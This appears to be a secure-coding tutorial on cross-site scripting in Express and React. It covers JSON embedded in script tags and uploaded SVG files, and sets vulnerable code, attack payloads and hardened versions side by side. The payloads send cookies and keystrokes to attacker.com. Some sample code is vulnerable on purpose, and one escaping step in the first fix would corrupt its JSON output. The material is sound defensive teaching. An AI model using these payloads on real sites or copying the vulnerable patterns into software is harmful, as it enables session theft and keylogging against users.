Embedding user data directly into JSON within script tags is extremely dangerous and a common source of XSS vulnerabilities. This pattern is particularly insidious because many developers assume JSON is "safe" since it's data, not HTML.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const app = express();

app.get('/profile', (req, res) => {
  const userData = {
    name: req.query.name,
    email: req.query.email,
    bio: req.query.bio
  };

  // DANGEROUS: Embedding user input directly in script tag
  const html = `
    <!DOCTYPE html>
    <html>
    <head><title>Profile</title></head>
    <body>
      <div id="profile"></div>
      <script>
        const user = ${JSON.stringify(userData)};
        document.getElementById('profile').innerHTML = 
          '<h1>' + user.name + '</h1><p>' + user.bio + '</p>';
      </script>
    </body>
    </html>
  `;

  res.send(html);
});

app.listen(3000);
```

**Attack Payload**:
```text
/profile?name=John&bio=</script><script>fetch('https://attacker.com/steal?c='+document.cookie)</script><script>
```

Alternative payload exploiting JSON context:
```text
/profile?name="};alert(document.domain);//
```

**Why This Is Dangerous**:
- `JSON.stringify()` does NOT escape `</script>` sequences, allowing script tag breakout
- The closing `</script>` in user input terminates the legitimate script block
- Attacker can then inject arbitrary JavaScript that executes in the user's browser
- Even without script tag breakout, JSON property injection can modify object behavior
- `innerHTML` assignment creates a secondary DOM-based XSS vector

**SECURE VERSION**:

```javascript
const express = require('express');
const app = express();
const he = require('he'); // HTML entities encoder

// Secure JSON serializer that escapes dangerous sequences
function safeJSONForHTML(obj) {
  return JSON.stringify(obj)
    .replace(/</g, '\\u003c')      // Escape < to prevent </script>
    .replace(/>/g, '\\u003e')      // Escape > for completeness
    .replace(/&/g, '\\u0026')      // Escape & to prevent entity injection
    .replace(/'/g, '\\u0027')      // Escape single quotes
    .replace(/"/g, '\\u0022');     // Escape double quotes in strings
}

// Input validation middleware
function validateProfileInput(req, res, next) {
  const { name, email, bio } = req.query;

  // Strict input validation
  const nameRegex = /^[a-zA-Z\s]{1,50}$/;
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (name && !nameRegex.test(name)) {
    return res.status(400).json({ error: 'Invalid name format' });
  }
  if (email && !emailRegex.test(email)) {
    return res.status(400).json({ error: 'Invalid email format' });
  }
  if (bio && bio.length > 500) {
    return res.status(400).json({ error: 'Bio too long' });
  }

  next();
}

app.get('/profile', validateProfileInput, (req, res) => {
  const userData = {
    name: req.query.name || 'Anonymous',
    email: req.query.email || '',
    bio: req.query.bio || ''
  };

  // SECURE: Use safe JSON serialization
  const safeJSON = safeJSONForHTML(userData);

  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Profile</title>
      <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
    </head>
    <body>
      <div id="profile"></div>
      <script>
        const user = ${safeJSON};
        // SECURE: Use textContent instead of innerHTML
        const profileDiv = document.getElementById('profile');
        const h1 = document.createElement('h1');
        h1.textContent = user.name;
        const p = document.createElement('p');
        p.textContent = user.bio;
        profileDiv.appendChild(h1);
        profileDiv.appendChild(p);
      </script>
    </body>
    </html>
  `;

  res.set('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

app.listen(3000);
```

**Key Security Controls**:
- **Unicode escaping**: Replace `<`, `>`, `&` with Unicode escape sequences (`\u003c`) which are valid in JSON but don't trigger HTML parsing
- **Input validation**: Whitelist allowed characters and enforce length limits before processing
- **DOM API usage**: Use `textContent` and DOM methods instead of `innerHTML` to prevent secondary XSS
- **Content-Security-Policy**: Restricts script execution to same-origin, blocking inline injection attempts

This is a complex real-world scenario that requires multiple layers of defense. When you need HTML in user content, you must use a strict allowlist-based HTML sanitizer and implement defense in depth.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const winston = require('winston');
const crypto = require('crypto');

const app = express();
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// Configure secure logger
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'security.log' })
  ]
});

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests' }
});

// Security headers via helmet
app.use(helmet());
app.use(limiter);
app.use(express.json({ limit: '10kb' }));

// DOMPurify configuration - strict allowlist
const SANITIZE_CONFIG = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li', 'a'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false,
  ALLOWED_URI_REGEXP: /^https?:\/\//i,  // Only http/https links
  RETURN_DOM: false,
  RETURN_DOM_FRAGMENT: false
};

// Secure JSON encoder for script context
class SecureJSONEncoder {
  static encode(obj) {
    const json = JSON.stringify(obj, this.replacer);
    return json
      .replace(/</g, '\\u003c')
      .replace(/>/g, '\\u003e')
      .replace(/&/g, '\\u0026')
      .replace(/\u2028/g, '\\u2028')  // Line separator
      .replace(/\u2029/g, '\\u2029'); // Paragraph separator
  }

  static replacer(key, value) {
    if (typeof value === 'string' && value.length > 10000) {
      throw new Error('String value too long');
    }
    return value;
  }
}

// Content processor with field-specific sanitization
class ContentProcessor {
  constructor() {
    this.htmlFields = new Set(['bio', 'description', 'content']);
    this.plainTextFields = new Set(['name', 'title', 'email']);
  }

  process(obj, path = '') {
    if (obj === null || obj === undefined) {
      return obj;
    }

    if (Array.isArray(obj)) {
      return obj.map((item, index) => 
        this.process(item, `${path}[${index}]`)
      );
    }

    if (typeof obj === 'object') {
      const processed = {};
      for (const [key, value] of Object.entries(obj)) {
        processed[key] = this.process(value, path ? `${path}.${key}` : key);
      }
      return processed;
    }

    if (typeof obj === 'string') {
      const fieldName = path.split('.').pop().replace(/\[\d+\]$/, '');
      return this.sanitizeField(fieldName, obj, path);
    }

    return obj;
  }

  sanitizeField(fieldName, value, fullPath) {
    if (this.htmlFields.has(fieldName)) {
      // Allow limited HTML - sanitize with DOMPurify
      const sanitized = DOMPurify.sanitize(value, SANITIZE_CONFIG);
      if (sanitized !== value) {
        logger.warn('HTML sanitization modified content', {
          field: fullPath,
          originalLength: value.length,
          sanitizedLength: sanitized.length
        });
      }
      return sanitized;
    }

    // Plain text fields - strip all HTML
    return this.escapeHTML(value);
  }

  escapeHTML(str) {
    const escapeMap = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;'
    };
    return str.replace(/[&<>"']/g, char => escapeMap[char]);
  }
}

const contentProcessor = new ContentProcessor();

// Generate nonce for CSP
function generateNonce() {
  return crypto.randomBytes(16).toString('base64');
}

app.get('/api/profile/:id', async (req, res) => {
  const nonce = generateNonce();

  try {
    // Simulate database fetch
    const rawUserData = {
      id: parseInt(req.params.id, 10),
      name: req.query.name || 'Test User',
      email: 'user@example.com',
      bio: req.query.bio || '<p>Hello <strong>world</strong>!</p>',
      posts: [
        {
          title: 'My First Post',
          content: '<p>This is <em>formatted</em> content.</p>',
          tags: ['tech', 'security']
        }
      ],
      metadata: {
        lastLogin: new Date().toISOString(),
        preferences: { theme: 'dark' }
      }
    };

    // Process and sanitize all fields
    const safeUserData = contentProcessor.process(rawUserData);

    // Encode for script context
    const encodedJSON = SecureJSONEncoder.encode(safeUserData);

    // Audit logging
    logger.info('Profile rendered', {
      userId: req.params.id,
      ip: req.ip,
      userAgent: req.get('User-Agent')
    });

    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>User Profile</title>
      </head>
      <body>
        <div id="app"></div>
        <script nonce="${nonce}">
          (function() {
            'use strict';
            const userData = ${encodedJSON};

            // Safe rendering function
            function renderProfile(user) {
              const app = document.getElementById('app');

              // Name - use textContent (plain text)
              const nameEl = document.createElement('h1');
              nameEl.textContent = user.name;
              app.appendChild(nameEl);

              // Bio - already sanitized, safe for innerHTML
              const bioEl = document.createElement('div');
              bioEl.className = 'bio';
              bioEl.innerHTML = user.bio; // Pre-sanitized HTML
              app.appendChild(bioEl);

              // Posts
              user.posts.forEach(post => {
                const article = document.createElement('article');
                const title = document.createElement('h2');
                title.textContent = post.title;
                article.appendChild(title);

                const content = document.createElement('div');
                content.innerHTML = post.content; // Pre-sanitized HTML
                article.appendChild(content);

                app.appendChild(article);
              });
            }

            renderProfile(userData);
          })();
        </script>
      </body>
      </html>
    `;

    // Set security headers
    res.set({
      'Content-Type': 'text/html; charset=utf-8',
      'Content-Security-Policy': `default-src 'self'; script-src 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'; img-src 'self' https:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'`,
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'X-XSS-Protection': '0',  // Disabled - CSP is preferred
      'Referrer-Policy': 'strict-origin-when-cross-origin'
    });

    res.send(html);

  } catch (error) {
    logger.error('Profile render error', {
      error: error.message,
      userId: req.params.id,
      ip: req.ip
    });

    res.status(500).json({ error: 'Internal server error' });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  logger.error('Unhandled error', {
    error: err.message,
    stack: err.stack,
    ip: req.ip,
    path: req.path
  });

  res.status(500).json({ error: 'Internal server error' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  logger.info(`Server started on port ${PORT}`);
});
```

**Defense in Depth Layers**:

1. **Input Layer - Field-Specific Sanitization**:
```javascript
// HTML fields get DOMPurify sanitization with strict allowlist
if (this.htmlFields.has(fieldName)) {
  return DOMPurify.sanitize(value, SANITIZE_CONFIG);
}
// Plain text fields get full HTML escaping
return this.escapeHTML(value);
```

2. **Encoding Layer - Secure JSON for Script Context**:
```javascript
// Unicode escape dangerous characters that could break out of script tag
return json
  .replace(/</g, '\\u003c')   // Prevents </script> breakout
  .replace(/>/g, '\\u003e')   // Prevents injection of HTML
  .replace(/\u2028/g, '\\u2028')  // Line separator (breaks JS strings)
  .replace(/\u2029/g, '\\u2029'); // Paragraph separator
```

3. **Browser Layer - Content Security Policy with Nonces**:
```javascript
// Only scripts with matching nonce execute
`script-src 'nonce-${nonce}'`
// Even if XSS payload injected, it won't have valid nonce
```

**Additional Protections**:
- **Rate limiting**: Prevents automated XSS probing attacks (100 requests/15 min)
- **Audit logging**: All profile renders logged with IP, user agent for forensics
- **Input size limits**: `express.json({ limit: '10kb' })` prevents payload bombing
- **Security headers**: Full set via Helmet - X-Content-Type-Options, X-Frame-Options prevent secondary attacks
- **Strict mode & IIFE**: Client-side code runs in strict mode within IIFE to prevent scope pollution
- **Nonce-based CSP**: Dynamic nonces per request, more secure than hash-based or 'unsafe-inline'
- **Graceful error handling**: Errors logged but not leaked to client, preventing information disclosure

SVG files are extremely dangerous for user uploads because they're essentially XML documents that can contain embedded JavaScript. Unlike regular images (PNG, JPG), SVGs can execute arbitrary code when rendered in the browser.

**VULNERABLE CODE**:

```typescript
import express, { Request, Response } from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs';

const app = express();
const upload = multer({ dest: 'uploads/' });

// DANGEROUS: No SVG content validation
app.post('/api/upload-avatar', upload.single('avatar'), (req: Request, res: Response) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  // Only checks file extension - easily bypassed!
  const ext = path.extname(req.file.originalname).toLowerCase();
  if (ext !== '.svg') {
    fs.unlinkSync(req.file.path);
    return res.status(400).json({ error: 'Only SVG files allowed' });
  }

  // Rename and serve directly - XSS vulnerability!
  const newPath = `uploads/avatars/${req.file.filename}.svg`;
  fs.renameSync(req.file.path, newPath);

  res.json({ avatarUrl: `/static/${req.file.filename}.svg` });
});

// React component that renders unsafe SVG
// UserAvatar.tsx
interface AvatarProps {
  svgUrl: string;
}

export const UserAvatar: React.FC<AvatarProps> = ({ svgUrl }) => {
  // DANGEROUS: Directly embedding SVG allows script execution
  return (
    <div 
      className="avatar"
      dangerouslySetInnerHTML={{ __html: `<object data="${svgUrl}" type="image/svg+xml"></object>` }}
    />
  );
};
```

**Attack Payload** (malicious SVG file):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <circle cx="50" cy="50" r="40" fill="blue"/>
  <script type="text/javascript">
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
    // Or inject keylogger
    document.addEventListener('keypress', function(e) {
      new Image().src = 'https://attacker.com/log?key=' + e.key;
    });
  </script>
  <!-- Alternative: event handler XSS -->
  <rect width="100" height="100" onload="alert(document.domain)" />
</svg>
```

**Why This Is Dangerous**:
- SVG `<script>` elements execute JavaScript when rendered
- Event handlers (`onload`, `onclick`, `onerror`) in SVG elements execute JS
- `<foreignObject>` elements can embed full HTML including scripts
- Using `<object>` or `<embed>` tags allows the SVG to run scripts
- File extension checks are trivially bypassed

**SECURE VERSION**:

```typescript
import express, { Request, Response } from 'express';
import multer from 'multer';
import { JSDOM } from 'jsdom';
import DOMPurify from 'dompurify';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';

const app = express();
const upload = multer({ 
  dest: 'uploads/temp/',
  limits: { fileSize: 100 * 1024 }, // 100KB max for SVG icons
  fileFilter: (req, file, cb) => {
    // Check MIME type (defense layer 1)
    if (file.mimetype !== 'image/svg+xml') {
      return cb(new Error('Only SVG files allowed'));
    }
    cb(null, true);
  }
});

// Create DOMPurify instance for server-side sanitization
const window = new JSDOM('').window;
const purify = DOMPurify(window);

// Configure DOMPurify for strict SVG sanitization
const PURIFY_CONFIG = {
  USE_PROFILES: { svg: true, svgFilters: true },
  // Remove all script-related elements and attributes
  FORBID_TAGS: ['script', 'foreignObject', 'set', 'animate', 'animateTransform'],
  FORBID_ATTR: [
    'onload', 'onclick', 'onerror', 'onmouseover', 'onfocus',
    'onblur', 'onchange', 'onsubmit', 'onreset', 'onselect',
    'onkeydown', 'onkeypress', 'onkeyup', 'href', 'xlink:href'
  ],
  // Allow only safe SVG elements
  ALLOWED_TAGS: [
    'svg', 'g', 'path', 'circle', 'ellipse', 'rect', 'line',
    'polyline', 'polygon', 'text', 'tspan', 'defs', 'use',
    'linearGradient', 'radialGradient', 'stop', 'clipPath', 'mask'
  ]
};

function sanitizeSvg(svgContent: string): string | null {
  try {
    const sanitized = purify.sanitize(svgContent, PURIFY_CONFIG);

    // Additional validation: ensure result is still valid SVG
    if (!sanitized.includes('<svg')) {
      return null;
    }

    return sanitized;
  } catch (error) {
    console.error('SVG sanitization failed:', error);
    return null;
  }
}

app.post('/api/upload-avatar', upload.single('avatar'), async (req: Request, res: Response) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  try {
    // Read and sanitize SVG content
    const rawContent = fs.readFileSync(req.file.path, 'utf-8');
    const sanitizedSvg = sanitizeSvg(rawContent);

    if (!sanitizedSvg) {
      fs.unlinkSync(req.file.path);
      return res.status(400).json({ error: 'Invalid or unsafe SVG content' });
    }

    // Generate secure filename
    const fileId = crypto.randomUUID();
    const safePath = path.join('uploads', 'avatars', `${fileId}.svg`);

    // Write sanitized content
    fs.writeFileSync(safePath, sanitizedSvg, 'utf-8');
    fs.unlinkSync(req.file.path); // Remove temp file

    res.json({ avatarUrl: `/avatars/${fileId}.svg` });
  } catch (error) {
    console.error('Upload processing error:', error);
    res.status(500).json({ error: 'Failed to process upload' });
  }
});
```

**Safe React Component**:
```typescript
import React from 'react';

interface SafeAvatarProps {
  svgUrl: string;
  alt: string;
}

export const SafeUserAvatar: React.FC<SafeAvatarProps> = ({ svgUrl, alt }) => {
  // SECURE: Use <img> tag which doesn't execute SVG scripts
  return (
    <img 
      src={svgUrl}
      alt={alt}
      className="avatar"
      // Content Security Policy inline
      style={{ maxWidth: '100px', maxHeight: '100px' }}
    />
  );
};
```

**Key Security Controls**:
- **Server-side sanitization with DOMPurify**: Strips all script elements, event handlers, and dangerous attributes before storage
- **Strict allowlist approach**: Only permits known-safe SVG elements and attributes
- **Render via `<img>` tag**: When SVGs are loaded via `<img>`, browsers block script execution
- **MIME type validation**: First defense layer to reject obviously wrong files
- **File size limits**: Prevents DoS via massive SVG files

This is a challenging security scenario. Allowing inline SVGs for interactivity while preventing XSS requires a robust sanitization pipeline combined with React-controlled event handling. You essentially need to parse the SVG, sanitize it completely, then re-bind safe events through React.

**PRODUCTION PATTERN**:

```typescript
// svg-sanitizer.service.ts
import { JSDOM } from 'jsdom';
import DOMPurify from 'dompurify';
import { parse, HTMLElement as ParsedElement } from 'node-html-parser';

interface SvgSanitizationResult {
  success: boolean;
  sanitizedSvg: string | null;
  interactiveElements: InteractiveElement[];
  errors: string[];
}

interface InteractiveElement {
  id: string;
  elementType: string;
  originalId?: string;
}

const window = new JSDOM('').window;
const purify = DOMPurify(window);

// Strict allowlist configuration
const SVG_ALLOWED_TAGS = [
  'svg', 'g', 'path', 'circle', 'ellipse', 'rect', 'line', 'polyline',
  'polygon', 'text', 'tspan', 'textPath', 'defs', 'use', 'symbol',
  'linearGradient', 'radialGradient', 'stop', 'clipPath', 'mask',
  'pattern', 'title', 'desc'
];

const SVG_ALLOWED_ATTRS = [
  'id', 'class', 'style', 'viewBox', 'width', 'height', 'x', 'y',
  'cx', 'cy', 'r', 'rx', 'ry', 'd', 'points', 'fill', 'stroke',
  'stroke-width', 'stroke-linecap', 'stroke-linejoin', 'opacity',
  'transform', 'font-family', 'font-size', 'text-anchor',
  'xmlns', 'xmlns:xlink', 'preserveAspectRatio'
];

// DANGEROUS: These must NEVER be allowed
const BLOCKED_PATTERNS = [
  /javascript:/gi,
  /data:/gi,
  /vbscript:/gi,
  /<script/gi,
  /on\w+\s*=/gi,  // All event handlers
  /<foreignObject/gi,
  /<set/gi,
  /<animate.*?attributeName.*?href/gi,
  /xlink:href\s*=\s*["'](?!#)/gi,  // External xlink:href
];

export class SvgSanitizer {
  private static instanceCounter = 0;

  static sanitize(rawSvg: string): SvgSanitizationResult {
    const errors: string[] = [];
    const interactiveElements: InteractiveElement[] = [];

    try {
      // Phase 1: Block dangerous patterns before parsing
      for (const pattern of BLOCKED_PATTERNS) {
        if (pattern.test(rawSvg)) {
          return {
            success: false,
            sanitizedSvg: null,
            interactiveElements: [],
            errors: [`Blocked pattern detected: ${pattern.source}`]
          };
        }
      }

      // Phase 2: DOMPurify sanitization
      const purified = purify.sanitize(rawSvg, {
        USE_PROFILES: { svg: true },
        ALLOWED_TAGS: SVG_ALLOWED_TAGS,
        ALLOWED_ATTR: SVG_ALLOWED_ATTRS,
        FORBID_TAGS: ['script', 'foreignObject', 'set', 'animate', 'animateTransform', 'animateMotion'],
        FORBID_ATTR: ['onload', 'onclick', 'onerror', 'onmouseover', 'onfocus', 'href', 'xlink:href'],
        KEEP_CONTENT: false,
        IN_PLACE: false
      });

      // Phase 3: Parse and normalize for React
      const root = parse(purified);
      const svgElement = root.querySelector('svg');

      if (!svgElement) {
        return {
          success: false,
          sanitizedSvg: null,
          interactiveElements: [],
          errors: ['No valid SVG element found after sanitization']
        };
      }

      // Phase 4: Assign data attributes for React event binding
      const clickableElements = svgElement.querySelectorAll('rect, circle, path, ellipse, polygon, g[id]');

      clickableElements.forEach((el: ParsedElement) => {
        const elementId = `svg-interactive-${++this.instanceCounter}`;
        const originalId = el.getAttribute('id');

        el.setAttribute('data-interactive-id', elementId);
        el.setAttribute('tabindex', '0'); // Make keyboard accessible
        el.setAttribute('role', 'button');

        interactiveElements.push({
          id: elementId,
          elementType: el.tagName.toLowerCase(),
          originalId: originalId || undefined
        });
      });

      // Phase 5: Final validation - re-check for any injection attempts
      const finalSvg = svgElement.toString();
      for (const pattern of BLOCKED_PATTERNS) {
        if (pattern.test(finalSvg)) {
          return {
            success: false,
            sanitizedSvg: null,
            interactiveElements: [],
            errors: ['Post-sanitization security check failed']
          };
        }
      }

      return {
        success: true,
        sanitizedSvg: finalSvg,
        interactiveElements,
        errors: []
      };

    } catch (error) {
      return {
        success: false,
        sanitizedSvg: null,
        interactiveElements: [],
        errors: [`Sanitization error: ${error instanceof Error ? error.message : 'Unknown error'}`]
      };
    }
  }
}
```

**React Component with Safe Interactivity**:
```typescript
// InteractiveSvg.tsx
import React, { useCallback, useRef, useEffect } from 'react';
import DOMPurify from 'dompurify';

interface InteractiveSvgProps {
  sanitizedSvg: string;
  onElementClick?: (elementId: string, originalId?: string) => void;
  onElementHover?: (elementId: string | null) => void;
  className?: string;
}

// Client-side DOMPurify config (double sanitization)
const CLIENT_PURIFY_CONFIG = {
  USE_PROFILES: { svg: true },
  FORBID_TAGS: ['script', 'foreignObject'],
  FORBID_ATTR: ['onload', 'onclick', 'onerror', 'onmouseover'],
  ALLOW_DATA_ATTR: true // Allow our data-interactive-id
};

export const InteractiveSvg: React.FC<InteractiveSvgProps> = ({
  sanitizedSvg,
  onElementClick,
  onElementHover,
  className
}) => {
  const containerRef = useRef<HTMLDivElement>(null);

  // Double-sanitize on client side (defense in depth)
  const doubleSanitized = React.useMemo(() => {
    return DOMPurify.sanitize(sanitizedSvg, CLIENT_PURIFY_CONFIG);
  }, [sanitizedSvg]);

  // Attach event listeners via React, not inline handlers
  useEffect(() => {
    const container = containerRef.current;
    if (!container) return;

    const handleClick = (event: MouseEvent) => {
      const target = event.target as Element;
      const interactiveElement = target.closest('[data-interactive-id]');

      if (interactiveElement && onElementClick) {
        const elementId = interactiveElement.getAttribute('data-interactive-id');
        const originalId = interactiveElement.getAttribute('id');
        if (elementId) {
          onElementClick(elementId, originalId || undefined);
        }
      }
    };

    const handleMouseOver = (event: MouseEvent) => {
      const target = event.target as Element;
      const interactiveElement = target.closest('[data-interactive-id]');

      if (onElementHover) {
        const elementId = interactiveElement?.getAttribute('data-interactive-id');
        onElementHover(elementId || null);
      }
    };

    const handleKeyDown = (event: KeyboardEvent) => {
      if (event.key === 'Enter' || event.key === ' ') {
        const target = event.target as Element;
        const interactiveElement = target.closest('[data-interactive-id]');

        if (interactiveElement && onElementClick) {
          event.preventDefault();
          const elementId = interactiveElement.getAttribute('data-interactive-id');
          const originalId = interactiveElement.getAttribute('id');
          if (elementId) {
            onElementClick(elementId, originalId || undefined);
          }
        }
      }
    };

    container.addEventListener('click', handleClick);
    container.addEventListener('mouseover', handleMouseOver);
    container.addEventListener('keydown', handleKeyDown);

    return () => {
      container.removeEventListener('click', handleClick);
      container.removeEventListener('mouseover', handleMouseOver);
      container.removeEventListener('keydown', handleKeyDown);
    };
  }, [onElementClick, onElementHover]);

  return (
    <div
      ref={containerRef}
      className={className}
      dangerouslySetInnerHTML={{ __html: doubleSanitized }}
      role="img"
      aria-label="Interactive SVG graphic"
    />
  );
};
